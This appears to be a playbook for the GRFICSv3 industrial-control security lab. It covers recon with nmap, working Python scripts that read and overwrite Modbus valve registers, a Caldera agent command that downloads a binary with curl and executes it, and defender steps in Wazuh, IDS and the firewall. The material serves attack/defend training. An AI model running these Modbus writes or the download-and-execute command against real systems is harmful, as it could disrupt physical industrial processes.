# GRFICSv3 Running Lab Playbook

This guide starts after GRFICSv3 is already running.

Use it when the lab is live and you want to know exactly what to open, where to click, and what commands to run in Kali, Caldera, Wazuh, and the defender views.

Only run these commands inside your GRFICS lab.

## 0. Open the Lab Views

Open these in separate browser tabs or on separate computers.

| Role | Local URL | Login |
| --- | --- | --- |
| Simulation | `http://localhost` | none |
| Kali attacker | `http://localhost:6088` | `kali / kali` |
| Caldera | `http://localhost:8888` | `red / fortiphyd-red` |
| Wazuh defender | `http://localhost:5601` | `admin / admin` |
| Engineering workstation | `http://localhost:6080` | none |
| HMI | `http://localhost:6081` | `admin / admin` |
| PLC | `http://localhost:8080` | `openplc / openplc` |

If you are using another computer, replace `localhost` with the Mac IP.

Example:

```text
http://MAC_IP:6088
http://MAC_IP:5601
http://MAC_IP:8888
```

## 1. Know the Lab IPs

Use these addresses inside the GRFICS network.

| System | IP / URL | Purpose |
| --- | --- | --- |
| Kali | `192.168.90.6` | attacker machine |
| Router / firewall | `192.168.90.200` and `192.168.95.200` | routes DMZ to ICS |
| Caldera | `192.168.90.250:8888` | adversary emulation server |
| Wazuh | `192.168.90.20:5601` | defender/SIEM |
| HMI / ScadaLTS | `192.168.90.107:8080` | operator UI |
| PLC / OpenPLC | `192.168.95.2:8080` | PLC web UI |
| Feed 1 Modbus | `192.168.95.10:502` | valve + flow |
| Feed 2 Modbus | `192.168.95.11:502` | valve + flow |
| Purge Modbus | `192.168.95.12:502` | valve + flow |
| Product Modbus | `192.168.95.13:502` | valve + flow |
| Reactor/Tank Modbus | `192.168.95.14:502` | pressure + level |
| Analyzer Modbus | `192.168.95.15:502` | purge composition |

## 2. Open Kali and Start a Terminal

Go to:

```text
http://localhost:6088
```

Log in if prompted:

```text
kali / kali
```

Open Terminal inside the Kali desktop.

## 3. Confirm Kali Can Reach the Lab

In the Kali terminal, run:

```bash
ip addr
ip route
```

You should see Kali on the `192.168.90.0/24` network and a route toward `192.168.95.0/24`.

Ping the router:

```bash
ping -c 3 192.168.90.200
```

Ping the PLC:

```bash
ping -c 3 192.168.95.2
```

Ping a Modbus device:

```bash
ping -c 3 192.168.95.10
```

If these work, Kali can reach the plant network.

## 4. Discover Hosts from Kali

Scan the DMZ:

```bash
nmap -sn 192.168.90.0/24
```

Scan the ICS network:

```bash
nmap -sn 192.168.95.0/24
```

Scan important web services:

```bash
nmap -sT -sV -p 8080 192.168.95.2
nmap -sT -sV -p 8080 192.168.90.107
```

Scan Modbus devices:

```bash
nmap -sT -sV -p 502 192.168.95.10-15
```

What to look for:

```text
192.168.95.2    OpenPLC web server
192.168.95.10   Modbus TCP
192.168.95.11   Modbus TCP
192.168.95.12   Modbus TCP
192.168.95.13   Modbus TCP
192.168.95.14   Modbus TCP
192.168.95.15   Modbus TCP
```

## 5. Open the PLC from Kali

In Kali's browser, open:

```text
http://192.168.95.2:8080
```

Log in:

```text
openplc / openplc
```

This is the PLC web interface.

## 6. Open the HMI from Kali

In Kali's browser, open:

```text
http://192.168.90.107:8080
```

Log in:

```text
admin / admin
```

This is the ScadaLTS/HMI interface.

## 7. Read Modbus Values from Kali

The Modbus devices expose values through input registers.

In Kali terminal, run this exact command to read Feed 1:

```bash
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient

target = "192.168.95.10"
client = ModbusTcpClient(target, port=502)
client.connect()

try:
    result = client.read_input_registers(address=1, count=2, slave=1)
except TypeError:
    result = client.read_input_registers(1, 2, unit=1)

print("Feed 1 raw registers:", result.registers)
print("Register 1 = valve position scaled 0-65535")
print("Register 2 = flow scaled 0-65535")
client.close()
PY
```

Read all Modbus devices:

```bash
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient

devices = {
    "Feed 1": "192.168.95.10",
    "Feed 2": "192.168.95.11",
    "Purge": "192.168.95.12",
    "Product": "192.168.95.13",
    "Reactor/Tank": "192.168.95.14",
    "Analyzer": "192.168.95.15",
}

for name, ip in devices.items():
    client = ModbusTcpClient(ip, port=502)
    client.connect()
    count = 3 if name == "Analyzer" else 2
    try:
        result = client.read_input_registers(address=1, count=count, slave=1)
    except TypeError:
        result = client.read_input_registers(1, count, unit=1)
    print(f"{name:12} {ip:15} {result.registers}")
    client.close()
PY
```

How to interpret the output:

| Device | Register 1 | Register 2 | Register 3 |
| --- | --- | --- | --- |
| Feed 1 | valve position | flow | none |
| Feed 2 | valve position | flow | none |
| Purge | valve position | flow | none |
| Product | valve position | flow | none |
| Reactor/Tank | pressure | liquid level | none |
| Analyzer | A in purge | B in purge | C in purge |

Values are scaled from `0` to `65535`.

## 8. Change a Valve from Kali

Watch the simulation in another browser tab while you do this.

The command below changes Feed 1's valve setpoint.

`0` means closed.

`32768` is about 50%.

`65535` is fully open.

Close Feed 1:

```bash
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("192.168.95.10", port=502)
client.connect()
try:
    result = client.write_register(address=1, value=0, slave=1)
except TypeError:
    result = client.write_register(1, 0, unit=1)
print(result)
client.close()
PY
```

Set Feed 1 to about 50%:

```bash
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("192.168.95.10", port=502)
client.connect()
try:
    result = client.write_register(address=1, value=32768, slave=1)
except TypeError:
    result = client.write_register(1, 32768, unit=1)
print(result)
client.close()
PY
```

Open Feed 1 fully:

```bash
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("192.168.95.10", port=502)
client.connect()
try:
    result = client.write_register(address=1, value=65535, slave=1)
except TypeError:
    result = client.write_register(1, 65535, unit=1)
print(result)
client.close()
PY
```

Repeat the same idea for other controllable valve devices:

| Valve | IP | Register |
| --- | --- | --- |
| Feed 1 | `192.168.95.10` | `1` |
| Feed 2 | `192.168.95.11` | `1` |
| Purge | `192.168.95.12` | `1` |
| Product | `192.168.95.13` | `1` |

## 9. Watch Defender Logs

Open Wazuh:

```text
http://localhost:5601
```

Log in:

```text
admin / admin
```

Go to:

```text
Wazuh -> Security events
```

Look for events from:

```text
router
EWS
scadalts
```

If the full SIEM profile is running, confirm agents from your Mac terminal:

```bash
docker exec wazuh /var/ossec/bin/agent_control -l
```

You want:

```text
EWS Active
router Active
scadalts Active
```

## 10. Watch the Router IDS

Open the router/firewall UI from a browser that can reach the lab network.

Inside the lab network:

```text
http://192.168.90.200:5000
```

Login:

```text
admin / password
```

Click:

```text
IDS
```

Run scans from Kali again:

```bash
nmap -sT -sV -p 502 192.168.95.10-15
```

Then refresh the IDS page and look for recent alerts.

## 11. Add a Simple IDS Rule

In the router UI:

```text
http://192.168.90.200:5000
```

Go to:

```text
IDS
```

In the custom rules box, add:

```text
alert tcp any any -> any 502 (msg:"LAB Modbus TCP access"; sid:1000001; rev:1;)
```

Click:

```text
Save & Apply
```

From Kali, run:

```bash
nmap -sT -p 502 192.168.95.10
```

Refresh the IDS page. You should see the custom Modbus alert.

## 12. Add a Firewall Block Rule

Use this to block Kali from reaching a Modbus device.

Open:

```text
http://192.168.90.200:5000
```

Login:

```text
admin / password
```

Go to:

```text
Firewall
```

Add a rule:

```text
Incoming Interface: WAN (eth2)
Protocol: tcp
Source: 192.168.90.6
Destination: 192.168.95.10
Destination Port: 502
Action: DROP
```

Click:

```text
Apply Changes
```

From Kali, test:

```bash
nmap -sT -p 502 192.168.95.10
```

The port should now look filtered or unreachable.

Remove the rule afterward if you want the attack path open again.

## 13. Use Caldera

Open Caldera:

```text
http://localhost:8888
```

Login:

```text
red / fortiphyd-red
```

### Start a Caldera Agent on Kali

In Caldera:

```text
Agents -> Deploy an agent
```

Choose:

```text
Platform: Linux
Contact: HTTP
Group: red
```

Caldera will show a shell command.

Copy it.

In the Kali terminal, paste it.

If the copied command uses `localhost` or `0.0.0.0`, replace the server value with:

```text
http://192.168.90.250:8888
```

Example command pattern:

```bash
server="http://192.168.90.250:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red -v
```

Go back to:

```text
Caldera -> Agents
```

Wait until the Kali agent appears.

### Run a Manual Command Through Caldera

In Caldera:

```text
Operations -> Create Operation
```

Use:

```text
Adversary: any basic discovery adversary, or create a blank/manual operation
Group: red
Planner: atomic
```

Start the operation.

Run a manual command such as:

```bash
whoami
```

Then run:

```bash
ip route
```

Then run:

```bash
nmap -sT -p 502 192.168.95.10
```

Check Wazuh after each command.

## 14. Run the Built-In Modbus Caldera Ability

This repo includes a Modbus ability:

```text
Modbus - Read Device Information
```

It uses these facts:

```text
modbus.server.ip = 192.168.95.10
modbus.server.port = 502
modbus.read_device_info.level = 3
```

In Caldera:

```text
Adversaries -> Modbus Adversary
```

Start an operation using that adversary.

If the operation asks for a source/facts, use:

```text
Modbus Sample Facts
```

Expected behavior:

```text
Caldera tasks the Kali agent.
The agent runs the Modbus payload.
The target is 192.168.95.10:502.
Wazuh/IDS may show related activity.
```

## 15. Simple Attack/Defend Exercise

Use this sequence for a live demo.

### Attacker

In Kali:

```bash
nmap -sn 192.168.95.0/24
nmap -sT -sV -p 502 192.168.95.10-15
```

Read the process:

```bash
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient
for ip in ["192.168.95.10","192.168.95.11","192.168.95.12","192.168.95.13","192.168.95.14","192.168.95.15"]:
    c = ModbusTcpClient(ip, port=502)
    c.connect()
    try:
        r = c.read_input_registers(address=1, count=2, slave=1)
    except TypeError:
        r = c.read_input_registers(1, 2, unit=1)
    print(ip, r.registers)
    c.close()
PY
```

Change Feed 1:

```bash
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("192.168.95.10", port=502)
c.connect()
try:
    print(c.write_register(address=1, value=0, slave=1))
except TypeError:
    print(c.write_register(1, 0, unit=1))
c.close()
PY
```

### Observer

Watch:

```text
Simulation
HMI
PLC
```

Look for process changes.

### Defender

Check:

```text
Wazuh -> Security events
Router UI -> IDS
Router UI -> Firewall Logs
```

### Recover

Set Feed 1 back to open:

```bash
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("192.168.95.10", port=502)
c.connect()
try:
    print(c.write_register(address=1, value=65535, slave=1))
except TypeError:
    print(c.write_register(1, 65535, unit=1))
c.close()
PY
```

## 16. Quick Reset Commands

From your Mac terminal, restart the whole lab:

```bash
docker compose --profile siem down
docker compose --profile siem up -d
```

Check status:

```bash
docker compose --profile siem ps
```

Check Wazuh agents:

```bash
docker exec wazuh /var/ossec/bin/agent_control -l
```

